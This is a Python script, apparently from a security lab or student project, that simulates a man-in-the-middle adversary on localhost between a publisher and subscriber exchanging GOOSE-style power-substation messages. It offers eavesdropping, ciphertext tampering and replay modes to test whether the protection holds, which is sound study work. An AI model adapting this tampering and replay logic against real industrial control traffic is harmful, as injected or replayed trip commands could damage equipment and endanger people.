import socket
import json
import time
import argparse

# --- Terminal Arguments ---
parser = argparse.ArgumentParser(description="Adversary Proxy (MITM)")
parser.add_argument("--attack", type=str, choices=['eavesdrop', 'tamper', 'replay'], default='eavesdrop', 
                    help="Which attack to simulate: eavesdrop (passive), tamper (modify data), replay (resend old data)")
args = parser.parse_args()

# The real Publisher is on 65432, we host the fake server on 65433
PUB_HOST = '127.0.0.1'
PUB_PORT = 65432
FAKE_PORT = 65433

def start_adversary():
    print(f"[*] =======================================")
    print(f"[*] ADVERSARY TERMINAL ONLINE")
    print(f"[*] Active Attack Mode: {args.attack.upper()}")
    print(f"[*] =======================================\n")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as adversary_server:
        adversary_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        adversary_server.bind((PUB_HOST, FAKE_PORT))
        adversary_server.listen()
        print(f"[*] Listening for victim Subscriber on port {FAKE_PORT}...")

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as adversary_client:
            print(f"[*] Connecting to real Publisher on port {PUB_PORT}...")
            while True:
                try:
                    adversary_client.connect((PUB_HOST, PUB_PORT))
                    print("[+] Connected to real Publisher!")
                    break
                except ConnectionRefusedError:
                    time.sleep(1)

            sub_conn, sub_addr = adversary_server.accept()
            with sub_conn:
                print(f"[+] Victim Subscriber connected from {sub_addr}!\n")

                buffer = ""
                message_count = 0
                
                while True:
                    data = adversary_client.recv(4096)
                    if not data:
                        print("[-] Publisher closed connection.")
                        break

                    buffer += data.decode('utf-8')

                    while '\n' in buffer:
                        line, buffer = buffer.split('\n', 1)
                        message_count += 1
                        
                        try:
                            payload = json.loads(line)
                            algo_used = payload.get('algo', 'Unknown')
                            
                            # ==========================================
                            # SHOW WHAT THE ATTACKER SEES
                            # ==========================================
                            print(f"\n[!!!] INTERCEPTED PACKET {message_count} [!!!]")
                            print(f"[*] Algorithm Tag: {algo_used}")
                            print(f"[*] Extracting Raw Data from Network Wire:")
                            
                            for key, value in payload.items():
                                if key not in ['algo', 'metrics', 'send_timestamp']:
                                    # Truncate super long hex strings so the terminal stays readable
                                    display_val = f"{value[:40]}... (truncated)" if isinstance(value, str) and len(value) > 40 else value
                                    print(f"    -> {key.capitalize()}: {display_val}")
                                    
                            # ==========================================
                            # SMART EAVESDROPPING: BLIND DECODE ATTEMPT
                            # ==========================================
                            raw_hex = payload.get("data", "")
                            is_encrypted = True
                            
                            try:
                                # 1. Convert hex to bytes
                                raw_bytes = bytes.fromhex(raw_hex)
                                
                                # 2. Try to decode bytes into a standard text string
                                readable_text = raw_bytes.decode('utf-8')
                                
                                # 3. Verify it actually looks like our JSON dictionary
                                if readable_text.strip().startswith("{"):
                                    is_encrypted = False
                                    
                                    print(f"\n    [!] HACKER SUCCESSFULLY DECODED THE PAYLOAD:")
                                    print(f"    -> {readable_text[:80]}... (truncated)")
                                    
                                    # Parse it to steal specific variables!
                                    stolen_json = json.loads(readable_text)
                                    trip_val = stolen_json.get("APDU", {}).get("Trip_Command")
                                    print(f"    -> STOLEN DATA: Trip_Command is {trip_val}")
                                    
                                    print("\n    [!] Status: VULNERABLE! The GOOSE APDU is fully readable.")
                                    
                            except (ValueError, UnicodeDecodeError, json.JSONDecodeError):
                                # If decoding fails, it's because the data is true ciphertext (random binary)
                                pass

                            if is_encrypted:
                                print("\n    [?] Status: SECURE. GOOSE APDU is encrypted ciphertext.")
                            print("-" * 50)
                            
                            # ==========================================
                            # ATTACK LOGIC
                            # ==========================================
                            
                            if args.attack == 'eavesdrop':
                                # PASSIVE: Just forward the data untouched
                                print(f"    [>] EAVESDROP: Forwarding untouched packet to Subscriber...")
                                sub_conn.sendall(line.encode('utf-8') + b'\n')
                                
                            elif args.attack == 'tamper':
                                # ACTIVE: Modify the ciphertext slightly to simulate tampering
                                print(f"    [>] TAMPERING: Flipping bits in the ciphertext...")
                                original_data = payload.get("data", "")
                                
                                if len(original_data) > 4:
                                    # Maliciously change the last 4 characters of the hex string to "0000"
                                    tampered_data = original_data[:-4] + "0000"
                                    payload["data"] = tampered_data
                                    
                                # Repackage and send the poisoned JSON
                                poisoned_line = json.dumps(payload)
                                sub_conn.sendall(poisoned_line.encode('utf-8') + b'\n')
                                print(f"    [>] TAMPERING: Poisoned packet forwarded to Subscriber!")

                            elif args.attack == 'replay':
                                # ACTIVE: Send the legitimate message, and then maliciously send it AGAIN
                                print(f"    [>] REPLAY: Forwarding legitimate message...")
                                sub_conn.sendall(line.encode('utf-8') + b'\n')
                                
                                # Wait a tiny fraction of a second, then strike
                                time.sleep(0.05)
                                print(f"    [>] REPLAY: Injecting exact duplicate packet into the network!")
                                sub_conn.sendall(line.encode('utf-8') + b'\n')

                        except json.JSONDecodeError:
                            pass

if __name__ == "__main__":
    start_adversary()